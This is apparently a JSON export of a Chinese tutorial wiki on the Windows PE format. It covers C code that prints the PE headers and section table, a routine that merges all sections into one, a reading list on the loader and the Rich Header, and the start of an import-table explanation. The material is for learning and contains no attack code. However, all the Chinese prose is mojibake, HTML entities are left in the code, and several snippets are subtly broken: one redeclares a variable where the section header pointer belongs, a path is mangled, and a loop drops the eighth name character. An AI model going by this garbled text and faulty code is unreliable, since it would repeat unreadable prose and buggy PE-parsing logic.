æ–¹å¼ä¸€ç»§ç»­ä½¿ç”¨pImageNTHeaders32ï¼ŒæŒ‡å‘ç»“æ„ä½“ï¼Œç„¶åç”¨.è®¿é—®ç»“æ„ä½“ä¸­çš„æˆå‘˜ï¼Œä»£ç å¦‚ä¸‹ï¼š 1printf(&quot; Machine: %X &quot;, pImageNTHeaders32-&gt;FileHeader.Machine); æ–¹å¼äºŒpImageNTHeaders32çš„å€¼+4ï¼Œè·³è¿‡4å­—èŠ‚çš„Signatureï¼Œå°±æ˜¯æ ‡å‡†PEå¤´çš„åœ°å€ï¼Œä»£ç å¦‚ä¸‹ï¼š 12PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);printf(&quot; Machine: 0x%04X &quot;, pImageFileHeader-&gt;Machine); æ‰©å±•PEå¤´ å’Œæ ‡å‡†PEå¤´ä¸€æ ·ï¼Œå¯ä»¥ç”¨.è®¿é—®ç»“æ„ä½“æˆå‘˜ï¼Œæˆ–ç”¨PIMAGE_OPTIONAL_HEADER32æŒ‡é’ˆæ¥è®¿é—®ã€‚ æ‰©å±•PEå¤´çš„èµ·å§‹åœ°å€ï¼šæ ‡å‡†PEå¤´èµ·å§‹åœ°å€+æ ‡å‡†PEå¤´çš„å¤§å°ã€‚IMAGE_SIZEOF_FILE_HEADERå®è¡¨ç¤ºäº†æ ‡å‡†PEå¤´çš„å¤§å°ã€‚ä¹Ÿå¯ä»¥+sizeof(IMAGE_FILE_HEADER) 1PIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER); å‡½æ•°å£°æ˜å‡½æ•°å®ç°12345678#pragma once/* å‡½æ•°åŠŸèƒ½ï¼šæ‰“å°ä¸€ä¸ªPEæ–‡ä»¶çš„PEå¤´ï¼šPEæ ‡è¯†ï¼Œæ ‡å‡†PEå¤´ï¼Œæ‰©å±•PEå¤´ inputå‚æ•°ï¼š pBufferï¼šæ–‡ä»¶å†…å­˜æ˜ åƒåŸºå€ è¿”å›å€¼ï¼šæ— */void PrintPEHeaders(const void* pBuffer);12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &quot;PrintPEHeaders.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;void PrintPEHeaders(const void* pBuffer)&#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer; PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); //PEæ ‡è¯† printf(&quot;-&gt;IMAGE_NT_HEADERS32 &quot;); printf(&quot; Signature: 0x%08X &quot;, pImageNTHeaders32-&gt;Signature); //æ ‡å‡†PEå¤´ PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4); printf(&quot;-&gt;IMAGE_FILE_HEADERS32 &quot;); printf(&quot; Machine: 0x%04X &quot;, pImageFileHeader-&gt;Machine); printf(&quot; NumberOfSections: 0x%04X &quot;, pImageFileHeader-&gt;NumberOfSections); printf(&quot; TimeDateStamp: 0x%08X &quot;, pImageFileHeader-&gt;TimeDateStamp); printf(&quot; PointerToSymbolTable: 0x%08X &quot;, pImageFileHeader-&gt;PointerToSymbolTable); printf(&quot; NumberOfSymbols: 0x%08X &quot;, pImageFileHeader-&gt;NumberOfSymbols); printf(&quot; SizeOfOptionalHeader: 0x%04X &quot;, pImageFileHeader-&gt;SizeOfOptionalHeader); printf(&quot; Characteristics: 0x%04X &quot;, pImageFileHeader-&gt;Characteristics); //æ‰©å±•PEå¤´ PIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER); printf(&quot;-&gt;IMAGE_OPTIONAL_HEADER32 &quot;); printf(&quot; Magic: 0x%04X &quot;, pImageOptionalHeader-&gt;Magic); printf(&quot; MajorLinkerVersion: 0x%02X &quot;, pImageOptionalHeader-&gt;MajorLinkerVersion); printf(&quot; MinorLinkerVersion: 0x%02X &quot;, pImageOptionalHeader-&gt;MinorLinkerVersion); printf(&quot; SizeOfCode: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfCode); printf(&quot; SizeOfInitializedData: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfInitializedData); printf(&quot; SizeOfUninitializedData: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfUninitializedData); printf(&quot; AddressOfEntryPoint: 0x%08X &quot;, pImageOptionalHeader-&gt;AddressOfEntryPoint); printf(&quot; BaseOfCode: 0x%08X &quot;, pImageOptionalHeader-&gt;BaseOfCode); printf(&quot; BaseOfData: 0x%08X &quot;, pImageOptionalHeader-&gt;BaseOfData); printf(&quot; ImageBase: 0x%08X &quot;, pImageOptionalHeader-&gt;ImageBase); printf(&quot; SectionAlignment: 0x%08X &quot;, pImageOptionalHeader-&gt;SectionAlignment); printf(&quot; FileAlignment: 0x%08X &quot;, pImageOptionalHeader-&gt;FileAlignment); printf(&quot; MajorOperatingSystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MajorOperatingSystemVersion); printf(&quot; MinorOperatingSystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MinorOperatingSystemVersion); printf(&quot; MajorImageVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MajorImageVersion); printf(&quot; MinorImageVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MinorImageVersion); printf(&quot; MajorSubsystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MajorSubsystemVersion); printf(&quot; MinorSubsystemVersion: 0x%04X &quot;, pImageOptionalHeader-&gt;MinorSubsystemVersion); printf(&quot; Win32VersionValue: 0x%08X &quot;, pImageOptionalHeader-&gt;Win32VersionValue); printf(&quot; SizeOfImage: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfImage); printf(&quot; SizeOfHeaders: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfHeaders); printf(&quot; CheckSum: 0x%08X &quot;, pImageOptionalHeader-&gt;CheckSum); printf(&quot; Subsystem: 0x%04X &quot;, pImageOptionalHeader-&gt;Subsystem); printf(&quot; DllCharacteristics: 0x%04X &quot;, pImageOptionalHeader-&gt;DllCharacteristics); printf(&quot; SizeOfStackReserve: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfStackReserve); printf(&quot; SizeOfStackCommit: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfStackCommit); printf(&quot; SizeOfHeapReserve: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfHeapReserve); printf(&quot; SizeOfHeapCommit: 0x%08X &quot;, pImageOptionalHeader-&gt;SizeOfHeapCommit); printf(&quot; LoaderFlags: 0x%08X &quot;, pImageOptionalHeader-&gt;LoaderFlags); printf(&quot; NumberOfRvaAndSizes: 0x%08X &quot;, pImageOptionalHeader-&gt;NumberOfRvaAndSizes);&#125; èŠ‚è¡¨ èŠ‚è¡¨çš„èµ·å§‹åœ°å€=æ‰©å±•PEå¤´èµ·å§‹åœ°å€+æ ‡å‡†PEå¤´.SizeOfOptionalHeader æ‰©å±•PEå¤´å¤§å°å¯å˜ï¼Œæœ€å‡†ç¡®çš„æ–¹å¼çœ‹æ ‡å‡†PEå¤´.SizeOfOptionalHeaderè¿™ä¸ªå€¼ã€‚ 12345PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;PIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);PIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageOptionalHeader+ pImageFileHeader-&gt;SizeOfOptionalHeader); èŠ‚è¡¨çš„æ•°é‡ç”±æ ‡å‡†PEå¤´.NumberOfSectionsæŒ‡å‡ºï¼Œæ‰€ä»¥è¦å†™ä¸ªå¾ªç¯ä¾æ¬¡æ‰“å°æ¯ä¸ªèŠ‚è¡¨ã€‚ 12345PIMAGE_SECTION_HEADER pTempImageSectionHeader = pImageSectionHeader;for (int i = 0 ; i &lt; pImageFileHeader-&gt;NumberOfSections; i++, pTempImageSectionHeader++)&#123;\t//æ‰“å°å„å­—æ®µ&#125; Nameå­—æ®µå¦‚æœè¶…è¿‡8ä¸ªï¼Œå°±æ²¡æœ‰ç»“æŸç¬¦ï¼Œä¸èƒ½ç›´æ¥%sã€‚æœ‰ä¸¤ç§æ–¹å¼è§£å†³ï¼š æ–¹å¼ä¸€æ–¹å¼äºŒå½“pNameä¸ä¸ºç©ºå¹¶ä¸”åœ¨8ä¸ªå­—ç¬¦å†…ï¼Œå°±æ‰“å°è¯¥å­—ç¬¦ 1234567891011//è¾“å‡ºNameint j = 0;const char* pName = (char*)pTempImageSectionHeader-&gt;Name;while (*pName &amp;&amp; j &lt; 7)&#123;\tprintf(&quot;%c&quot;, *pName);\tpName++;\tj++;&#125;printf(&quot; &quot;);å°†Nameæ‹·åˆ°ä¸€ä¸ªé•¿åº¦ä¸º9çš„å­—ç¬¦æ•°ç»„SectionNameä¸­ï¼Œç„¶å%sæ‰“å°è¯¥æ•°ç»„ å¦‚æœå­—ç¬¦æ•°&lt;8ï¼ŒåŸæœ¬çš„Nameæœ‰ç»“æŸç¬¦ï¼Œä¼šåœä¸‹ å¦‚æœå­—ç¬¦æ•°â‰¥8ï¼Œäººä¸ºåœ¨æœ«å°¾æ·»åŠ ç»“æŸç¬¦ï¼Œä¼šåœä¸‹ 123456//è¾“å‡ºNameï¼Œç¡®ä¿èŠ‚åç§°å ç”¨8ä¸ªå­—ç¬¦å®½åº¦char SectionName[9]; //èŠ‚åç§°æœ€å¤§8ä¸ªå­—ç¬¦ + 1ä¸ªç©ºå­—ç¬¦strncpy(SectionName, (const char*)pTempImageSectionHeader-&gt;Name, 8);SectionName[8] = &#x27;\\0&#x27;; // ç¡®ä¿å­—ç¬¦ä¸²ä»¥ç©ºå­—ç¬¦ç»“å°¾printf(&quot;%s &quot;, SectionName); å‡½æ•°å£°æ˜å‡½æ•°å®ç°12345678#pragma once/* å‡½æ•°åŠŸèƒ½ï¼šæ‰“å°ä¸€ä¸ªPEæ–‡ä»¶çš„èŠ‚è¡¨ inputå‚æ•°ï¼š pBufferï¼šæ–‡ä»¶å†…å­˜æ˜ åƒåŸºå€ è¿”å›å€¼ï¼šæ— */void PrintSectionTable(const void* pBuffer);123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;PrintSectionTable.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;void PrintSectionTable(const void* pBuffer)&#123;\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\tprintf(&quot;-&gt;Section Header Table &quot;);\t//è¾“å‡ºèŠ‚è¡¨ä¸­çš„å­—æ®µ\tPIMAGE_SECTION_HEADER pTempImageSectionHeader = pImageSectionHeader; //éå†èŠ‚è¡¨ç”¨çš„\tfor (int i = 0 ; i &lt; pImageFileHeader-&gt;NumberOfSections; i++, pTempImageSectionHeader++)\t&#123; printf(&quot; %d. item: &quot;,i); //è¾“å‡ºName printf(&quot; Name: &quot;); int j = 0; const char* pName = (char*)pTempImageSectionHeader-&gt;Name; while (*pName &amp;&amp; j &lt; 7) &#123; printf(&quot;%c&quot;, *pName); pName++; j++; &#125; printf(&quot; &quot;); //è¾“å‡ºå…¶ä»–å­—æ®µ printf(&quot; Misc: 0x%08X &quot;, pTempImageSectionHeader-&gt;Misc.VirtualSize); printf(&quot; VirtualAddress: 0x%08X &quot;, pTempImageSectionHeader-&gt;VirtualAddress); printf(&quot; SizeOfRawData: 0x%08X &quot;, pTempImageSectionHeader-&gt;SizeOfRawData); printf(&quot; PointerToRawData: 0x%08X &quot;, pTempImageSectionHeader-&gt;PointerToRawData); printf(&quot; PointerToRelocations: 0x%08X &quot;, pTempImageSectionHeader-&gt;PointerToRelocations); printf(&quot; PointerToLinenumbers: 0x%08X &quot;, pTempImageSectionHeader-&gt;PointerToLinenumbers); printf(&quot; NumberOfRelocations: 0x%04X &quot;, pTempImageSectionHeader-&gt;NumberOfRelocations); printf(&quot; NumberOfLinenumbers: 0x%04X &quot;, pTempImageSectionHeader-&gt;NumberOfLinenumbers); printf(&quot; Characteristics: 0x%08X &quot;, pTempImageSectionHeader-&gt;Characteristics);\t&#125;&#125;"},{"title":"To Learn List","path":"/wiki/PE/To_Learn_List.html","content":"Res123 èµ·å› æ˜¯åŒå‡»ä¸€ä¸ªexeådllçš„åŠ è½½é¡ºåºé—®é¢˜ï¼Œå¼•ç”¨çš„æƒ³çœ‹ç³»ç»ŸåŠ è½½å™¨æºç  https://chatgpt.com/c/f4d7882a-852f-4f55-9695-0eedf4af6081 æœåˆ°çš„ç›¸å…³æ–‡ç« ï¼š https://www.google.com/search?q=LdrpRunInitializeÂ­Routines+Matt+Pietrek's&amp;oq=LdrpRunInitializeÂ­Routines+Matt+Pietrek's&amp;gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDEwNjFqMGoxqAIAsAIA&amp;sourceid=chrome&amp;ie=UTF-8#ip=1 https://learn.microsoft.com/en-us/archive/msdn-magazine/2002/march/windows-2000-loader-what-goes-on-inside-windows-2000-solving-the-mysteries-of-the-loader https://www.cnblogs.com/dubingsky/archive/2009/06/25/1510940.html https://www.cnblogs.com/dubingsky/archive/2009/06/25/1510940.html https://www.cnblogs.com/fwycmengsoft/p/4036569.html https://bbs.kanxue.com/thread-49869-1.htm https://www.cnblogs.com/tinaluo/p/13469325.html ç„¶åçŸ¥é“äº†ä¸€ä¸ªé‡å†™çš„é¡¹ç›®ï¼Œblackbone åé¢ç ”ç©¶å­¦ä¹ ä¸‹æºç  Rich Header(undocumented) To understand better: https://www.ntcore.com/files/richsign.htm https://0xrick.github.io/win-internals/pe3/ (also a good blog to learn) https://github.com/RichHeaderResearch/RichPE lab: https://github.com/dishather/richprint https://blog.csdn.net/r250414958/article/details/123759371 tools: https://github.com/hasherezade/bearparser may useful: https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/ https://www.youtube.com/watch?v=XX0IW7WuzUo https://bytepointer.com/articles/the_microsoft_rich_header.htm https://www.donationcoder.com/forum/?action=printpage;topic=11956.0 To brows: https://www.pediy.com/kssd/pediy12/125447.html https://stackoverflow.com/questions/13983794/how-to-get-vc-compiler-version-from-pe-file-programmatically https://developercommunity.visualstudio.com/t/add-linker-option-to-strip-rich-stamp-from-exe-hea/740443 https://securelist.com/the-devils-in-the-rich-header/84348/ https://twitter.com/cglyer/status/1182019207627726851 https://www.semanticscholar.org/paper/Leveraging-the-PE-Rich-Header-for-Static-Malware-Dubyk/4af43d4e9b17bb0057448d49fc58ad0552788c17 https://reverseengineering.stackexchange.com/questions/22218/can-i-use-the-rich-header-to-find-out-compiler-and-linker-used http://trendystephen.blogspot.com/2008/01/rich-header.html record: https://dev.to/yumetodo/list-of-mscver-and-mscfullver-8nd"},{"title":"åˆå¹¶èŠ‚","path":"/wiki/PE/åˆå¹¶èŠ‚.html","content":"ç°æœ‰èŠ‚è¡¨åæ²¡ç©ºä½æ–°æ·»ä¸€ä¸ªèŠ‚è¡¨çš„ä¿¡æ¯ï¼ŒDos Stubä¹Ÿæ²¡æœ‰å¯åˆ©ç”¨çš„ç©ºé—´ï¼Œå¯ä»¥ç”¨åˆå¹¶èŠ‚ã€‚è¿™é‡Œçš„åˆå¹¶èŠ‚æ˜¯åˆå¹¶èŠ‚è¡¨ä¸­ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰å®é™…ç§»åŠ¨èŠ‚æ•°æ®çš„ä½ç½®ã€‚ æ­¥éª¤ ä»¥å°†æ‰€æœ‰èŠ‚åˆå¹¶ä¸ºä¸€ä¸ªèŠ‚ä¸ºä¾‹ï¼š ä¿®æ”¹ç¬¬ä¸€ä¸ªèŠ‚çš„å­—æ®µ VirtualAddressï¼šä¸ç”¨æ”¹ PointerToRawDataï¼šä¸ç”¨æ”¹ Misc.VirtualSizeå’ŒSizeOfRawDataæ”¹æˆä¸€æ ·çš„ï¼Œéƒ½æ”¹æˆæŒ‰å†…å­˜å¯¹é½çš„å¤§å° é€šç”¨è®¡ç®—æ–¹å¼ï¼š è®¡ç®—æ–¹å¼ä¸€ï¼šVirtualSize = SizeOfImage - ç¬¬ä¸€ä¸ªèŠ‚çš„VirtualAddress è®¡ç®—æ–¹å¼äºŒï¼šæœ€åä¸€ä¸ªèŠ‚çš„VirtualAddress + max{VirtualSizeï¼ŒSizeOfRawData} - SizeOfHeaderæŒ‰å†…å­˜å¯¹é½åçš„å¤§å° SizeOfImageçš„å¤§å°â‰¥æœ€åä¸€ä¸ªèŠ‚.VirtualAddress+max{Misc,SizeOfRawData}æŒ‰å†…å­˜å¯¹é½åçš„å€¼ SizeOfHeaderæŒ‰å†…å­˜å¯¹é½åçš„å¤§å°å…¶å®å°±æ˜¯ç¬¬ä¸€ä¸ªèŠ‚çš„VirtualAddressã€‚ è®¡ç®—æ–¹å¼äºŒå’Œè®¡ç®—æ–¹å¼ä¸€æ˜¯ä¸€æ ·çš„ï¼Œåœ¨ç¼–ç¨‹æ—¶ç”¨æ–¹å¼ä¸€å°±ä¸éœ€è¦æœ€åä¸€ä¸ªèŠ‚çš„èŠ‚è¡¨æŒ‡é’ˆ å½“æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½æ—¶ ç‰¹æ®Šçš„è®¡ç®—æ–¹æ³•ï¼šSizeOfImage-SizeOfHeaderï¼ˆå…¶å®å°±æ˜¯ç¬¬ä¸€ä¸ªèŠ‚çš„VirtualAddressï¼‰ Characteristicsï¼šä¿®æ”¹ä¸ºæ‰€æœ‰èŠ‚å±æ€§æˆ–èµ·æ¥çš„ç»“æœã€‚å› ä¸ºåˆå¹¶æˆä¸€ä¸ªèŠ‚äº†ï¼Œè¿™ä¸ªèŠ‚è¦æ»¡è¶³åˆå¹¶å‰æ‰€æœ‰èŠ‚çš„å±æ€§ã€‚ ï¼ˆå¯é€‰ï¼‰å°†å…¶ä»–èŠ‚è¡¨ä¿¡æ¯ç½®0 ä¿®æ”¹èŠ‚è¡¨æ•°é‡ä¸º1 ç¼–ç¨‹å®ç° é€šè¿‡å‰é¢çš„ç»ƒä¹ å·²ç»çŸ¥é“ï¼šSizeOfImageçš„å¤§å°â‰¥æœ€åä¸€ä¸ªèŠ‚.VirtualAddress+max{Misc,SizeOfRawData}æŒ‰å†…å­˜å¯¹é½åçš„å€¼ã€‚æ‰€ä»¥ç›´æ¥åœ¨ImageBufferä¸Šå°†èŠ‚è¡¨ä¿¡æ¯åˆå¹¶ï¼Œç„¶åImageBuffer-&gt;FileBufferï¼Œç„¶åå­˜ç›˜ ä¹‹å‰æƒ³ç€è¿˜è¦ä¸è¦ç”¨æœ€åä¸€ä¸ªèŠ‚.VirtualAddress+max{Misc,SizeOfRawData}æŒ‰å†…å­˜å¯¹é½åçš„å€¼æ¥ç”³è¯·ç©ºé—´ï¼Œå…¶å®File-&gt;Imageæ—¶ï¼ŒPEçš„SizeOfImageå·²æœ‰è¿™å±‚æ„æ€äº† 12345678910111213141516171819202122232425262728293031VOID PEManipulator::MergeAllSections()&#123; PEHeaders ImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return; &#125; printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;); if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return; &#125; //æ›´æ–°ç¬¬ä¸€ä¸ªèŠ‚çš„èŠ‚è¡¨ä¿¡æ¯ PIMAGE_SECTION_HEADER pSecHdrToFirstSection = ImagePEHeaders.SecHdr; pSecHdrToFirstSection-&gt;Misc.VirtualSize = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage - pSecHdrToFirstSection-&gt;VirtualAddress; pSecHdrToFirstSection-&gt;SizeOfRawData = pSecHdrToFirstSection-&gt;Misc.VirtualSize; for (int i = 1; i &lt; ImagePEHeaders.PeHdr-&gt;NumberOfSections; i++) &#123; pSecHdrToFirstSection-&gt;Characteristics |= ImagePEHeaders.SecHdr[i].Characteristics; &#125; // 3. æ›´æ–°èŠ‚è¡¨æ•°é‡ä¸º1 ImagePEHeaders.PeHdr-&gt;NumberOfSections = 1; printf(&quot; [+] All sections have been merged into the first section successfully. &quot;);&#125; æµ‹è¯•ï¼š 12345678910111213141516171819202122232425//æµ‹è¯•åˆå¹¶èŠ‚int TestMergeAllSections()&#123; //ç”¨ä¾‹1ï¼šfg.exe æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ //PEManipulator PEFile(&quot;E:\\\\temp\\\\MergeAllSections\\\\fg.exe&quot;); //ç”¨ä¾‹2ï¼šnotepad.exe æ–‡ä»¶å¯¹é½200h å†…å­˜å¯¹é½1000h PEManipulator PEFile(&quot;E:\\\\temp\\\\MergeAllSections\\ otepad.exe&quot;); if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.FileBufferToImageBuffer(); PEFile.MergeAllSections(); PEFile.ImageBufferToNewFileBuffer(); if (!PEFile.SaveFile(3)) &#123; return 1; &#125; return 0;&#125;"},{"title":"å¯¼å…¥è¡¨","path":"/wiki/PE/å¯¼å…¥è¡¨.html","content":"å‰è¨€ ä¸€ä¸ªPEæ–‡ä»¶çš„å¯¼å…¥è¡¨ä¸­è®°å½•äº†å½“å‰PEæ–‡ä»¶è¿è¡Œæ—¶éœ€è¦ç”¨åˆ°å“ªäº›PEæ–‡ä»¶ï¼Œç”¨åˆ°é‚£ä¸ªPEæ–‡ä»¶ä¸­çš„å“ªäº›å‡½æ•°ã€‚ æ¯”å¦‚fg.exeçš„å¯¼å…¥è¡¨æŒ‡å‡ºï¼Œè¿è¡Œæ—¶éœ€è¦ç”¨åˆ°kernel32.dllï¼Œuser32.dllç­‰dllã€‚å…¶ä¸­ï¼Œè¦ç”¨åˆ°kernel32.dllä¸­CreateProcessï¼ŒExitProcessç­‰å‡½æ•°ã€‚ å¯¼å…¥çš„dllå¦‚æœä¹Ÿæœ‰å¯¼å…¥è¡¨ï¼Œç³»ç»ŸåŠ è½½å™¨ä¼šé€’å½’åœ°ç»§ç»­åŠ è½½å®ƒæ‰€ä¾èµ–çš„dllï¼Œç›´åˆ°æ‰€æœ‰çš„ä¾èµ–éƒ½è¢«åŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸ºæ­¢ã€‚ æˆ‘ä»¬å†™ä¸€æ®µç¤ºä¾‹ä»£ç ï¼Œè§‚å¯Ÿä¸‹è‡ªå·±å†™çš„æ™®é€šå‡½æ•°å’Œå¯¼å…¥å‡½æ•°åœ¨åæ±‡ç¼–ä¸Šè°ƒç”¨ä»£ç çš„åŒºåˆ«ã€‚ VCdebugæ¨¡å¼ç¼–è¯‘1234567891011121314#include &lt;Windows.h&gt;int Fun(int x, int y)&#123; return x + y;&#125;int main()&#123; int r = Fun(1, 2); MessageBox(0, 0, 0, 0); return 0;&#125; Funï¼Œä»£è¡¨è‡ªå·±å†™çš„æ™®é€šå‡½æ•°MessageBoxï¼Œä»£è¡¨å¯¼å…¥çš„å‡½æ•°ç›´æ¥è°ƒç”¨ï¼Œå†™æ­»çš„åœ°å€ï¼Œç›´æ¥callï¼Œcallè¿‡å» ç”¨çš„callæ˜¯é—´æ¥è°ƒç”¨ï¼Œè°ƒç”¨42A2AChé‡Œå­˜çš„é‚£ä¸ªæ•° ç°åœ¨æˆ‘ä»¬çœ‹çœ‹åœ¨æ–‡ä»¶ä¸­42A2AChï¼Œè¿™å—åœ°å€é‡Œå­˜çš„å†…å®¹æ˜¯ä»€ä¹ˆã€‚è¿™æ˜¯è¿è¡Œæ—¶çš„PEï¼Œå°†42A2AChå‡å»400000hï¼ˆImageBaseï¼‰å¾—åˆ°2A2AChï¼ˆRVAï¼‰ï¼ŒRVAè½¬FOAå¾—åˆ°ï¼ˆè¿‡ç¨‹ç•¥ï¼‰282AChã€‚ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰¾è¿‡å»ï¼Œçœ‹åˆ°282AChå­˜çš„ä¸æ˜¯ä¸Šé¢ODçœ‹åˆ°çš„å‡½æ•°åœ°å€757B15F0hã€‚è€Œæ˜¯00022ADChè¿™ä¹ˆä¸€ä¸ªæ•°ï¼ˆåé¢ä¼šæï¼Œè¿™ä¸ªå€¼æ˜¯ä¸ªRVAï¼Œè½¬FOAåæ‰¾è¿‡å»ï¼Œæ‰¾åˆ°çš„æ˜¯æç¤ºåè¡¨Hint-name Tableï¼Œä¼šæ‰¾åˆ°MessageBoxAå‡½æ•°åï¼‰ã€‚ è¿™ä¸€å—æ˜¯IATè¡¨çš„çŸ¥è¯†ï¼Œåé¢ä¼šæã€‚é€šè¿‡è¿™ä¸ªå®éªŒå¯ä»¥å…ˆç²—æµ…åœ°å¾—çŸ¥ï¼š PEæ–‡ä»¶åŠ è½½å‰ï¼Œ42A2AChè¿™é‡Œæ˜¯ä¸€ä¸ªæŒ‡å‘æç¤ºåè¡¨Hint-nameçš„RVAåœ°å€ï¼Œæç¤ºåè¡¨ä¸­è®°å½•äº†å¯¼å…¥å‡½æ•°çš„åå­—ã€‚ PEæ–‡ä»¶åŠ è½½åï¼Œ42A2AChè¿™é‡Œä¼šè¢«æ›¿æ¢æˆMessaBoxAçš„å®é™…åœ°å€ ï¼ˆç”±ä¸€å †42A2AChè¿™æ ·çš„åœ°å€ç»„æˆçš„å°±æ˜¯IATè¡¨ï¼Œåœ¨æ–‡ä»¶æ—¶IATè¡¨è¡¨é¡¹æŒ‡å‘æç¤ºåè¡¨Hint-name Tableï¼Œåœ¨æ¨¡å—è½½å…¥åï¼ŒIATè¡¨ä¸­çš„è¡¨é¡¹ä¼šç”±ç³»ç»ŸåŠ è½½å™¨æ›¿æ¢ä¸ºå¯¼å…¥å‡½æ•°çš„å‡½æ•°åœ°å€ï¼‰ã€‚ å¯¼å…¥è¡¨ ä»æ‹“å±•PEå¤´.æ•°æ®ç›®å½•è¡¨æ•°æ®çš„ç¬¬2ä¸ªæˆå‘˜å¾—åˆ°å¯¼å…¥è¡¨çš„èµ·å§‹åœ°å€ï¼ˆè¿™ä¸ªå€¼æ˜¯RVAï¼‰å’Œå¤§å°ã€‚ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; å°†RVAè½¬ä¸ºFOAåï¼Œæ‰¾è¿‡å»ï¼Œæ˜¯ç¬¬ä¸€ä¸ªå¯¼å…¥è¡¨çš„èµ·å§‹ä½ç½®ã€‚å¯¼å…¥è¡¨ç”±ä¸€å †IMAGE_IMPORT_DESCRIPTORï¼ˆIIDï¼‰ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ç»„æˆã€‚ 1234567891011typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; DWORD OriginalFirstThunk; // æŒ‡å‘INTè¡¨çš„RVAåœ°å€ &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // æ—¶é—´æˆ³ DWORD ForwarderChain; // ä¸ä½¿ç”¨ DWORD Name; // æŒ‡å‘å¯¼å…¥çš„DLLåï¼ŒRVAåœ°å€ DWORD FirstThunk; // æŒ‡å‘IATè¡¨çš„RVAåœ°å€&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; ä»¥å…¨0çš„IMAGE_IMPORT_DESCRIPTORç»“æ„ä½“ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ OriginalFirstThunkï¼šä¸€ä¸ªæŒ‡å‘å¯¼å…¥åç§°è¡¨ï¼ˆINTï¼ŒImport Name Tableï¼‰çš„RVAåœ°å€ã€‚ 